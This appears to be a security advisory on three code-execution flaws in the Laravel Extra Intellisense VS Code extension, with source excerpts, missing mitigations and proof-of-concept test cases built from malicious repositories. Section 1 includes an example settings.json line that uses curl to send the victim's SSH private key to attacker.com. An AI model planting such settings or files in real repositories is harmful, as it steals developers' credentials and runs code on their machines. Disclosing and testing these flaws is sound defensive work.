# Laravel Extra Intellisense Security Vulnerabilities

## 1. Command Injection via phpCommand Configuration

### Description
The Laravel Extra Intellisense extension allows users to configure a custom PHP command template via the `LaravelExtraIntellisense.phpCommand` setting. This setting is intended to support Docker environments, but it can be exploited for command injection. When a victim opens a malicious repository that contains a `.vscode/settings.json` file with a crafted `phpCommand` configuration, the extension will execute arbitrary system commands when it attempts to analyze the Laravel project.

Steps to trigger:
1. Create a malicious repository containing a Laravel project
2. Add a `.vscode/settings.json` file with a specially crafted `phpCommand` setting
3. Share the repository with a victim
4. When the victim opens the repository in VSCode with the Laravel Extra Intellisense extension installed, the malicious command will execute

### Impact
An attacker can achieve remote code execution on the victim's machine with the privileges of the VSCode process. This allows the attacker to access sensitive information, install malware, or perform other malicious actions.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension attempts to escape some special characters in the code being executed, such as double quotes, dollar signs, and backslashes. However, this is insufficient protection against command injection through the command template itself.

```typescript
code = code.replace(/\"/g, "\\\"");
if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
    code = code.replace(/\$/g, "\\$");
    code = code.replace(/\\\\'/g, '\\\\\\\\\'');
    code = code.replace(/\\\\"/g, '\\\\\\\\\"');
}
```

### Missing Mitigations
1. No validation or sanitization of the `phpCommand` configuration value
2. No warning to users about the security implications of this setting
3. No execution in a restricted environment or sandbox
4. No use of safer execution methods like `execFile` that doesn't invoke a shell
5. No prompting for user confirmation before executing commands with custom phpCommand configurations

### Preconditions
1. The victim must open a repository with VSCode that contains a malicious `.vscode/settings.json` file
2. The Laravel Extra Intellisense extension must be installed
3. The repository must appear to be a Laravel project (contain an artisan file)

### Source Code Analysis
The vulnerability is primarily in the `runPhp` method in `helpers.ts`:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");
    if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
        code = code.replace(/\$/g, "\\$");
        code = code.replace(/\\\\'/g, '\\\\\\\\\'');
        code = code.replace(/\\\\"/g, '\\\\\\\\\"');
    }
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);

    // Then executes using cp.exec()
    cp.exec(command,
        { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
        function (err, stdout, stderr) {
            // handle output
        }
    );
}
```

The vulnerability occurs because:

1. The extension reads the `phpCommand` configuration, which can be set in the repository's `.vscode/settings.json`
2. It performs simple string replacement of `{code}` with the PHP code to execute
3. The resulting command is passed directly to `cp.exec()` without any validation
4. If an attacker includes shell metacharacters or command separators in the `phpCommand` configuration, they can inject additional commands

For example, a malicious repository might include:

```json
{
  "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\" & curl -s http://attacker.com/exfil.php?data=$(cat ~/.ssh/id_rsa)"
}
```

When the extension starts up, it will run various PHP code snippets to gather information about the Laravel project, and each execution will trigger the malicious command.

### Security Test Case
1. Create a new Laravel project repository with a malicious configuration:
   ```
   mkdir malicious-laravel
   cd malicious-laravel
   touch artisan
   mkdir -p .vscode
   ```

2. Create a `.vscode/settings.json` file with a malicious command:
   ```json
   {
     "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\" & echo PWNED > proof.txt"
   }
   ```

3. Have the victim clone and open the repository with VSCode that has the Laravel Extra Intellisense extension installed

4. The extension will automatically activate and execute PHP commands to analyze the Laravel project

5. After opening the repository, verify that a file named `proof.txt` has been created in the repository root, containing the text "PWNED"

6. For a more sophisticated attack, the command could execute a reverse shell or download and execute malware

## 2. Code Execution via Arbitrary File Inclusion

### Description
The Laravel Extra Intellisense extension dynamically includes PHP files from directories specified in the `modelsPaths` configuration setting and executes code from various Laravel project files to gather metadata for autocomplete functionality. If a malicious repository contains specially crafted PHP files in these directories, they will be executed when the extension analyzes the project.

Steps to trigger:
1. Create a malicious repository with a valid Laravel project structure
2. Inject malicious code into files that will be loaded by the extension, such as models, service providers, or core Laravel files
3. When the victim opens the repository, the extension loads these files and executes the malicious code

### Impact
An attacker can achieve arbitrary PHP code execution in the context of the Laravel application, which could lead to system compromise depending on the permissions of the PHP process.

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension includes a security note in the README warning users about potential risks, but does not implement technical mitigations against malicious project files.

### Missing Mitigations
1. Validation or sandboxing of included PHP files
2. Warning users about the security implications of opening untrusted repositories
3. No option to restrict which projects the extension will process

### Preconditions
1. The victim must open a repository with VSCode that contains malicious PHP files
2. The Laravel Extra Intellisense extension must be installed

### Source Code Analysis
In `EloquentProvider.ts`, the `loadModels()` method sends PHP code that dynamically includes all PHP files from the model paths:

```typescript
Helpers.runLaravel(
    "foreach (['" + vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models']).join('\', \'') + "'] as $modelPath) {" +
    "   if (is_dir(base_path($modelPath))) {" +
    "      foreach (scandir(base_path($modelPath)) as $sourceFile) {" +
    "         if (substr($sourceFile, -4) == '.php' && is_file(base_path(\"$modelPath/$sourceFile\"))) {" +
    "             include_once base_path(\"$modelPath/$sourceFile\");" +
    "         }" +
    "      }" +
    "   }" +
    "}"
    // ...more code...
)
```

This code will include any PHP file found in the model paths, which by default are `app` and `app/Models`. An attacker can place malicious PHP files in these directories that will be executed when the extension analyzes the models.

Additionally, in `src/helpers.ts`, the `runLaravel` method loads and executes code from the project:

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
    if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
        var command =
            "define('LARAVEL_START', microtime(true));" +
            "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
            "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
            // ... more code that gets executed
            code +
            // ... more code

        // Then this command is executed using runPhp
    }
}
```

The vulnerability occurs because:
1. The extension looks for and loads `vendor/autoload.php` and `bootstrap/app.php` from the project
2. These files are executed in the PHP context without any validation
3. If these files contain malicious code, it will be executed

### Security Test Case
1. Create a malicious Laravel repository:
   ```
   mkdir malicious-laravel
   cd malicious-laravel
   touch artisan
   mkdir -p app/Models
   ```

2. Create a malicious PHP file at `app/Models/MaliciousModel.php`:
   ```php
   <?php
   // This code will execute when the extension loads models
   file_put_contents('proof_model_execution.txt', 'Model code execution successful');

   // Make it look like a legitimate model
   class MaliciousModel extends \Illuminate\Database\Eloquent\Model {
       // Empty model class
   }
   ```

3. Have the victim clone and open the repository in VSCode with the Laravel Extra Intellisense extension

4. The extension will analyze the models, including the malicious file

5. Verify that a file named `proof_model_execution.txt` has been created, demonstrating successful code execution

Alternatively, create a malicious repository with infected core Laravel files:

1. Create a basic Laravel project structure with `vendor/autoload.php`:
   ```php
   <?php
   // Malicious code
   file_put_contents('/tmp/rce-proof.txt', 'RCE successful');

   // Regular autoload functionality to avoid suspicion
   ```

2. When the victim opens the project, the extension will load this file and execute the malicious code

3. Verify by checking for the existence of `/tmp/rce-proof.txt`

## 3. Command Injection via Inadequate Escaping

### Vulnerability Name
Command Injection due to Inadequate Escaping in PHP Code Execution

### Description
The extension attempts to escape certain characters in the PHP code before passing it to the command execution, but the escaping logic is insufficient to prevent all command injection vectors. A malicious repository could contain specially crafted code that breaks out of the PHP code context and executes arbitrary system commands.

Steps to trigger:
1. Create a malicious repository with code that exploits the inadequate escaping
2. When the victim opens the repository, the extension will execute PHP commands to extract metadata
3. The malicious code will break out of the PHP code context and execute arbitrary commands

### Impact
An attacker can execute arbitrary code on the victim's system, potentially leading to data theft, malware installation, or system compromise.

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension attempts to escape some characters:
```typescript
code = code.replace(/\"/g, "\\\"");
if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
    code = code.replace(/\$/g, "\\$");
    code = code.replace(/\\\\'/g, '\\\\\\\\\'');
    code = code.replace(/\\\\"/g, '\\\\\\\\\"');
}
```

### Missing Mitigations
1. More comprehensive escaping of all potential command injection characters
2. Using PHP's built-in argument passing mechanisms instead of string concatenation
3. Using a safer execution method like `execFile` that doesn't invoke a shell
4. Implementing proper input validation for all PHP code that will be executed

### Preconditions
1. The victim must have the extension installed
2. The victim must open a malicious Laravel project

### Source Code Analysis
The vulnerability stems from the way PHP code is executed in `helpers.ts`:

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
    if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
        var command =
            "define('LARAVEL_START', microtime(true));" +
            "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
            // more PHP code
            code +
            // more PHP code

        var self = this;

        return new Promise(function (resolve, error) {
            self.runPhp(command, description)
                // ...
        });
    }
    return new Promise((resolve, error) => resolve(""));
}
```

This code:
1. Takes user code and embeds it directly into a larger PHP script
2. Performs minimal escaping
3. Executes the result via `runPhp`

The escaping in `runPhp` doesn't handle all possible command injection vectors, such as backticks, semi-colons, or other shell metacharacters.

### Security Test Case
1. Create a Laravel project with a service provider that contains malicious code
2. The code should attempt to break out of the PHP execution context, for example:
   ```php
   <?php
   // In a Laravel service provider or similar file
   class MaliciousServiceProvider extends ServiceProvider {
       public function register() {
           // Code that will be executed by the extension
           system("echo 'INJECTION_SUCCESSFUL' > injection_proof.txt");
       }
   }
   ```
3. Open the project in VSCode with the extension installed
4. Verify that a file named `injection_proof.txt` is created containing "INJECTION_SUCCESSFUL"

Alternatively, create a file that the extension would parse (e.g., a fake translation file) containing code that breaks out of the expected syntax:

```php
<?php
// Malicious translation file
return [
    'welcome' => 'Welcome to our site';
    file_put_contents('/tmp/hacked.txt', 'Code injection successful');
    '
];
```

When the extension attempts to parse the translations, the injected code will execute.
